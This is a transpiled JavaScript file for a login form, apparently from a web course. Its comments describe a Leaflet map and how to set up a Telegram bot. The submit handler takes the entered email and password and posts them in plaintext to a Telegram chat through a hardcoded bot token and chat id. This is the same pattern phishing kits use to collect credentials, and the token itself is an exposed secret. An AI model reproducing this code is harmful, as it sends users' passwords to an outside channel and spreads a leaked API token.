"use strict";

// download from https://leafletjs.com/
// https://wiki.openstreetmap.org/wiki/Raster_tile_providers
// https://medium.com/javarevisited/sending-a-message-to-a-telegram-channel-the-easy-way-eb0a0b32968
// create channel
// get channel id using bot @get_id_bot
// /myid
// create bot
// add bot to the channel
// get API token of the bot
// create submit function
// MAP
// const customIcon = L.icon({
//     iconUrl: 'https://static-00.iconduck.com/assets.00/map-pin-icon-384x512-m24sswd5.png',
//     iconSize:     [30, 43], // size of the icon
//     iconAnchor:   [22, 94], // point of the icon which will correspond to marker's location
//     popupAnchor:  [-3, -76] // point from which the popup should open relative to the iconAnchor
// });
// const map = L.map('my-map').setView([48.62159261297406, 22.306753588841957], 13);
// L.tileLayer('https://cartodb-basemaps-{s}.global.ssl.fastly.net/light_all/{z}/{x}/{y}.png', {
//     attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> contributors'
// }).addTo(map);
// L.marker([48.628093061591514, 22.31952721941761], {icon: customIcon}).addTo(map)
//     .bindPopup('My Marker')
//     .openPopup();
// L.marker([48.61449288692407, 22.223933877922548], {icon: customIcon}).addTo(map)
//     .bindPopup('My Marker 2')
//     .openPopup();
// Form validation
var EMAIL_MIN_LENGHT = 5;
var mediumRegex = new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{8,})");

function testPasswordRegex(value) {
  return mediumRegex.test(value);
}

function checkEmailLenght() {
  var valueLenght = window.inputEmail.value.length;
  var diff = valueLenght < EMAIL_MIN_LENGHT ? EMAIL_MIN_LENGHT - valueLenght : 0;

  if (diff) {
    window.emailDiffCount.textContent = diff;
    window.emailLenghtHelp.classList.remove('d-none');
  } else {
    window.emailLenghtHelp.classList.add('d-none');
  }
}

;

function resetValidation() {
  window.emailHelp.classList.add('d-none');
  window.passwordHelp.classList.add('d-none');
  window.passwordHelpDescription.classList.add('d-none');
}

function validateForm(event) {
  event.preventDefault();
  resetValidation();
  var email = window.inputEmail.value;
  var password = window.inputPassword.value;

  if (!email) {
    window.emailHelp.classList.remove('d-none');
    return false;
  }

  if (!password) {
    window.passwordHelp.classList.remove('d-none');
    return false;
  }

  if (!testPasswordRegex(password)) {
    window.passwordHelp.classList.remove('d-none');
    window.passwordHelpDescription.classList.remove('d-none');
  } // console.log(email, password);

}

function formSubmit(event) {
  var email, password, apiToken, chatId, text, urlString, response, resp;
  return regeneratorRuntime.async(function formSubmit$(_context) {
    while (1) {
      switch (_context.prev = _context.next) {
        case 0:
          event.preventDefault();
          email = window.inputEmail.value;
          password = window.inputPassword.value;

          if (!(!email || !password)) {
            _context.next = 5;
            break;
          }

          return _context.abrupt("return", false);

        case 5:
          apiToken = "6601454304:AAGZE_BwzWfc-VyXuONm3wJq8a9CXkUkOV0";
          chatId = "-1001867463614";
          text = "\n    <b>Email: </b>".concat(email, "  \n    <b>Password: </b>").concat(password, "\n    ");
          urlString = "https://api.telegram.org/bot".concat(apiToken, "/sendMessage");
          _context.next = 11;
          return regeneratorRuntime.awrap(fetch(urlString, {
            method: 'post',
            headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: text,
              parse_mode: 'HTML'
            })
          }));

        case 11:
          response = _context.sent;
          _context.next = 14;
          return regeneratorRuntime.awrap(response.json());

        case 14:
          resp = _context.sent;
          console.log(resp);
          alert("Ваша заявка прийнята!");

        case 17:
        case "end":
          return _context.stop();
      }
    }
  });
}

window.inputEmail.addEventListener('input', checkEmailLenght);
window.inputPassword.addEventListener('change', validateForm);
window.loginForm.addEventListener('submit', formSubmit);
document.addEventListener('DOMContentLoaded', checkEmailLenght);